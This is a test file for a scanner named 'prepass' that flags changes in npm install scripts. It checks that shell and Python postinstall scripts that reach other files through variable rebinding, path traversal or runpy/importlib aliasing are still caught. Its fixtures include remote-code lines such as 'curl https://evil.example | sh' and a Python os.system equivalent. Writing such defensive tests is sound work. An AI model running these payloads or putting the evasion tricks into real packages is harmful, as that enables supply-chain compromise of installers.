import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const pyc = "\x00\x00\x00\x00junk";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  "tools/ok.sh": "true\n",
  [f]: "true\n",
  "README.md": "a\n",
});

// A bounded tail is safe only when every assignment is a plain word
// ^[A-Za-z0-9_-]+$. A builtin -v name widens. A tilde is not a plain word.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["Q1 sh N+= builds ..", shE("N=.\nN+=.\n./tools/$N/docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q2 sh backslash-split ..", shE("N=.\\.\n./tools/$N/docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q3 sh quote-split ..", shE("N=.'.'\n./tools/$N/docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q4 sh for loop rebinds", shE("N=ok\nfor N in ../docs/run; do ./tools/$N.sh; done\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q5 sh read rebinds", shE("N=ok\nread N < docs/name.txt\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q6 sh declare rebinds", shE("N=ok\ndeclare N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q7 sh printf -v rebinds", shE("N=ok\nprintf -v N '%s' ../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q8 sh local rebinds", shE("N=ok\nlocal N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q9 sh readonly rebinds", shE("N=ok\nreadonly N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q10 sh unset + := default", shE("N=ok\nunset N\n: \"${N:=../docs/run}\"\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q11 sh export after safe assign", shE("N=ok\nexport N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q12 sh typeset rebinds", shE("N=ok\ntypeset N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q13 sh tilde value", shE("N=~\n./tools/$N/../../docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q14 sh tools/$N.sh traversal", shE("N=.\\./docs/run\nsh tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["Q15 py run_path alias", pyE("from runpy import run_path as rp\nrp('helper.pyc')\n", "helper.pyc"), "helper.pyc", pyc, false],
  ["Q16 py run_module via getattr", pyE("import runpy\ngetattr(runpy, 'run_module')('helper')\n", "helper.pyc"), "helper.pyc", pyc, false],
  ["Q17 py run_path docs file", pyE("import runpy\nrunpy.run_path('docs/x.py')\n", "docs/x.py"), "docs/x.py", py, true],
  ["Q18 py import_module joined dotted", pyE("import importlib\nimportlib.import_module('he' + 'lper')\n", "helper.pyc"), "helper.pyc", pyc, true],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}

test("a hyphen or underscore in a plain word stays on that directory", () => {
  for (const name of ["a-b", "a_b", "run2"]) {
    const base = shE("N=" + name + "\n./tools/$N.sh\n", "tools/" + name + ".sh");
    holds(base, "tools/" + name + ".sh", sh);
    expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
  }
});
